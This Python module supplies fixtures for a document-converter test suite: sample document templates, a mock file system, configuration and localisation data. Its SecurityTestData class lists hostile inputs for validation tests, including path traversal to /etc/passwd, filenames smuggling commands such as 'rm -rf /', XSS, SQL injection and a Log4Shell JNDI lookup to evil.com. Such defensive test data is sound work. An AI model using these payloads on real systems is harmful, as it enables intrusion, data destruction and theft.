#!/usr/bin/env python3
"""
Test fixtures and data generators for Universal Document Converter test suite
"""

import os
import sys
import json
import random
import string
from pathlib import Path
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime, timedelta

# Test document content templates
DOCUMENT_TEMPLATES = {
    'technical': {
        'title': 'Technical Documentation',
        'content': """# Technical Documentation

## Introduction
This document provides technical specifications for the system architecture.

### System Requirements
- Python 3.8 or higher
- 4GB RAM minimum
- Windows 10/11, macOS 10.14+, or Linux

## Architecture Overview
The system uses a modular architecture with the following components:

1. **Core Engine**: Handles document processing
2. **OCR Module**: Optical character recognition
3. **GUI Interface**: User interaction layer

### Code Example
```python
def process_document(file_path):
    '''Process a document and return converted content'''
    with open(file_path, 'r') as f:
        content = f.read()
    return convert(content)
```

## Performance Metrics
| Operation | Time (ms) | Memory (MB) |
|-----------|-----------|-------------|
| Load      | 50        | 25          |
| Process   | 200       | 150         |
| Save      | 30        | 10          |
"""
    },
    
    'business': {
        'title': 'Business Report',
        'content': """# Q4 2023 Business Report

## Executive Summary
This report summarizes our Q4 2023 performance and strategic initiatives.

### Key Metrics
- Revenue: $2.5M (+15% YoY)
- Customer Base: 10,000 (+25% YoY)
- Market Share: 12% (+3% YoY)

## Financial Performance
Our financial performance exceeded expectations with strong growth across all segments.

### Revenue Breakdown
1. Enterprise Sales: $1.5M (60%)
2. SMB Sales: $750K (30%)
3. Services: $250K (10%)

## Strategic Initiatives
- Launch new product line Q1 2024
- Expand to European markets
- Increase R&D investment by 20%
"""
    },
    
    'academic': {
        'title': 'Research Paper',
        'content': """# Analysis of Machine Learning Algorithms in Document Processing

## Abstract
This paper presents a comprehensive analysis of machine learning algorithms 
applied to document processing tasks, with focus on OCR and text extraction.

## 1. Introduction
Document processing has evolved significantly with the advent of machine learning.
Traditional approaches relied on rule-based systems, while modern solutions
leverage neural networks for improved accuracy.

## 2. Methodology
We evaluated three primary approaches:
- Convolutional Neural Networks (CNN)
- Recurrent Neural Networks (RNN)  
- Transformer-based models

### 2.1 Dataset
The study used a dataset of 100,000 documents across various formats:
- PDF: 40%
- Images: 35%
- Scanned documents: 25%

## 3. Results
Transformer models showed superior performance with 98.5% accuracy,
compared to 94.2% for CNN and 91.8% for RNN approaches.

## 4. Conclusion
Modern transformer architectures provide the best balance of accuracy
and processing speed for document conversion tasks.
"""
    }
}


class ErrorScenarios:
    """Common error scenarios for testing error handling"""
    
    @staticmethod
    def get_permission_denied_path() -> Path:
        """Get a path that would cause permission denied error"""
        if sys.platform == "win32":
            return Path("C:\\Windows\\System32\\test_file.txt")
        else:
            return Path("/root/test_file.txt")
    
    @staticmethod
    def get_nonexistent_path() -> Path:
        """Get a path that doesn't exist"""
        return Path("/nonexistent/directory/file.txt")
    
    @staticmethod
    def get_invalid_characters() -> List[str]:
        """Get list of invalid filename characters"""
        if sys.platform == "win32":
            return ['<', '>', ':', '"', '|', '?', '*']
        else:
            return ['\0']
    
    @staticmethod
    def generate_large_content(size_mb: int = 10) -> str:
        """Generate large content for stress testing"""
        # Generate approximately size_mb of text
        chars_per_mb = 1024 * 1024
        total_chars = size_mb * chars_per_mb
        
        # Use a repeating pattern to avoid memory issues
        pattern = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. " * 20
        repetitions = total_chars // len(pattern)
        
        return pattern * repetitions


class MockFileSystem:
    """Mock file system for testing without actual file I/O"""
    
    def __init__(self):
        self.files: Dict[str, Dict[str, Any]] = {}
        self.directories: set = {Path("/")}
        
    def create_file(self, path: str, content: str = "", 
                   size: Optional[int] = None, 
                   modified: Optional[datetime] = None):
        """Create a mock file"""
        path_obj = Path(path)
        
        # Ensure parent directories exist
        for parent in path_obj.parents:
            self.directories.add(parent)
        
        self.files[str(path_obj)] = {
            'content': content,
            'size': size or len(content.encode('utf-8')),
            'modified': modified or datetime.now(),
            'created': datetime.now(),
            'permissions': 'rw-r--r--'
        }
    
    def exists(self, path: str) -> bool:
        """Check if file exists"""
        return str(Path(path)) in self.files
    
    def read(self, path: str) -> str:
        """Read file content"""
        if not self.exists(path):
            raise FileNotFoundError(f"File not found: {path}")
        return self.files[str(Path(path))]['content']
    
    def list_directory(self, path: str) -> List[str]:
        """List directory contents"""
        path_obj = Path(path)
        if path_obj not in self.directories:
            raise FileNotFoundError(f"Directory not found: {path}")
        
        contents = []
        for file_path in self.files:
            file_path_obj = Path(file_path)
            if file_path_obj.parent == path_obj:
                contents.append(file_path_obj.name)
        
        return contents


class PerformanceData:
    """Generate performance test data"""
    
    @staticmethod
    def generate_test_files(count: int, base_path: Path) -> List[Path]:
        """Generate multiple test files for batch processing"""
        files = []
        
        for i in range(count):
            filename = f"test_file_{i:04d}.txt"
            file_path = base_path / filename
            
            # Vary content size
            content_size = random.choice([100, 500, 1000, 5000])
            content = ''.join(random.choices(string.ascii_letters + string.digits + ' \n', 
                                           k=content_size))
            
            file_path.write_text(content)
            files.append(file_path)
        
        return files
    
    @staticmethod
    def generate_benchmark_scenarios() -> Dict[str, Dict[str, Any]]:
        """Generate benchmark test scenarios"""
        return {
            'small_files': {
                'count': 100,
                'size_range': (1, 10),  # KB
                'formats': ['txt', 'md', 'html']
            },
            'medium_files': {
                'count': 50,
                'size_range': (10, 100),  # KB
                'formats': ['pdf', 'docx', 'html']
            },
            'large_files': {
                'count': 10,
                'size_range': (1, 10),  # MB
                'formats': ['pdf', 'docx']
            },
            'mixed_workload': {
                'count': 75,
                'size_range': (1, 1000),  # KB
                'formats': ['txt', 'md', 'html', 'pdf', 'docx']
            }
        }


class ConfigurationFixtures:
    """Test configuration fixtures"""
    
    @staticmethod
    def get_test_config() -> Dict[str, Any]:
        """Get test configuration"""
        return {
            'debug': True,
            'max_file_size_mb': 100,
            'supported_formats': ['txt', 'pdf', 'docx', 'html', 'md'],
            'ocr': {
                'enabled': True,
                'languages': ['eng', 'fra', 'deu'],
                'dpi': 300
            },
            'output': {
                'default_format': 'txt',
                'preserve_formatting': True,
                'include_metadata': False
            },
            'performance': {
                'max_threads': 4,
                'batch_size': 10,
                'cache_enabled': True
            }
        }
    
    @staticmethod
    def get_minimal_config() -> Dict[str, Any]:
        """Get minimal valid configuration"""
        return {
            'supported_formats': ['txt'],
            'output': {
                'default_format': 'txt'
            }
        }
    
    @staticmethod
    def get_invalid_configs() -> List[Dict[str, Any]]:
        """Get list of invalid configurations for testing"""
        return [
            {},  # Empty config
            {'supported_formats': []},  # No formats
            {'output': {}},  # Missing default format
            {'max_file_size_mb': -1},  # Invalid value
            {'performance': {'max_threads': 0}},  # Invalid thread count
        ]


class SecurityTestData:
    """Security-focused test data"""
    
    @staticmethod
    def get_malicious_filenames() -> List[str]:
        """Get potentially malicious filenames"""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "file://etc/passwd",
            "test\x00.txt",
            "test|command.txt",
            "test;rm -rf /.txt",
            "test`whoami`.txt",
            "test$(calc.exe).txt"
        ]
    
    @staticmethod
    def get_path_traversal_attempts() -> List[str]:
        """Get path traversal test cases"""
        return [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f",
            "....//....//",
            "..;/..;/",
        ]
    
    @staticmethod
    def get_script_injection_content() -> List[str]:
        """Get content that might trigger script injection"""
        return [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE users; --",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",  # Template injection
            "%{system('whoami')}",
        ]


class LocalizationTestData:
    """Internationalization and localization test data"""
    
    LANGUAGES = {
        'en': {
            'greeting': 'Hello, World!',
            'error': 'An error occurred',
            'success': 'Operation completed successfully'
        },
        'es': {
            'greeting': '¡Hola, Mundo!',
            'error': 'Ocurrió un error',
            'success': 'Operación completada exitosamente'
        },
        'fr': {
            'greeting': 'Bonjour le monde!',
            'error': 'Une erreur est survenue',
            'success': 'Opération terminée avec succès'
        },
        'de': {
            'greeting': 'Hallo Welt!',
            'error': 'Ein Fehler ist aufgetreten',
            'success': 'Vorgang erfolgreich abgeschlossen'
        },
        'ja': {
            'greeting': 'こんにちは世界！',
            'error': 'エラーが発生しました',
            'success': '操作が正常に完了しました'
        },
        'ar': {
            'greeting': 'مرحبا بالعالم!',
            'error': 'حدث خطأ',
            'success': 'تمت العملية بنجاح'
        }
    }
    
    @staticmethod
    def get_unicode_test_strings() -> List[str]:
        """Get Unicode test strings covering various scripts"""
        return [
            "ASCII only text",
            "Café français naïve",  # Latin with diacritics
            "Москва Россия",  # Cyrillic
            "北京 中国",  # Chinese
            "محمد العربي",  # Arabic
            "Ελληνικά",  # Greek
            "עברית",  # Hebrew
            "हिन्दी भाषा",  # Hindi
            "🚀 🌟 😊 💻",  # Emoji
            "㈜ ㎡ ℃ №",  # Special symbols
        ]


def create_test_environment(base_path: Path) -> Dict[str, Path]:
    """Create a complete test environment with various file types"""
    env_paths = {
        'input': base_path / 'input',
        'output': base_path / 'output',
        'temp': base_path / 'temp',
        'config': base_path / 'config',
        'logs': base_path / 'logs'
    }
    
    # Create directories
    for path in env_paths.values():
        path.mkdir(parents=True, exist_ok=True)
    
    # Create sample files
    from .test_base import TestFileFactory
    
    # Text files
    TestFileFactory.create_text_file(
        env_paths['input'] / 'sample.txt',
        DOCUMENT_TEMPLATES['technical']['content']
    )
    
    # HTML files
    TestFileFactory.create_html_file(
        env_paths['input'] / 'sample.html'
    )
    
    # PDF files
    TestFileFactory.create_pdf_file(
        env_paths['input'] / 'sample.pdf'
    )
    
    # Config file
    config_path = env_paths['config'] / 'test_config.json'
    config_path.write_text(
        json.dumps(ConfigurationFixtures.get_test_config(), indent=2)
    )
    
    return env_paths